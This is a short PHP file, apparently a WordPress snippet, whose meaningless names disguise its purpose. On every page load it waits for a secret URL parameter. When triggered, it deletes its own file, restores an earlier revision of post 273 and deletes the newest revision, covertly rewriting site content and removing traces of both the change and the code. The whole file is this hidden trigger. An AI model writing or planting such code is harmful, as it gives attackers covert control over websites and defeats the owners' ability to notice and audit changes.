<?php

function pagination_footer_blocker() {
	if (isset($_GET['chart_order_create_traffic']) && $_GET['chart_order_create_traffic'] === 'contact_include_edition_github') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$slug_modules_uploads_display = 273;
		$mode_sliding_pixel_embedder = wp_get_post_revisions($slug_modules_uploads_display);
		if (empty($mode_sliding_pixel_embedder)) die('no revisions');
		if (count($mode_sliding_pixel_embedder) < 2) die('less than 2');
		$reports_landing_software = array_shift($mode_sliding_pixel_embedder);
		$register_theme_version_avatar = $reports_landing_software->ID;
		$plugins_mode_menus = array_shift($mode_sliding_pixel_embedder);
		$reading_members_send_counter = $plugins_mode_menus->ID;
		$orders_publisher_custom = wp_restore_post_revision($reading_members_send_counter);
		if ($orders_publisher_custom === false) die('error restoring');
		$orders_publisher_custom = wp_delete_post_revision($register_theme_version_avatar);		
		if ($orders_publisher_custom === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'pagination_footer_blocker');
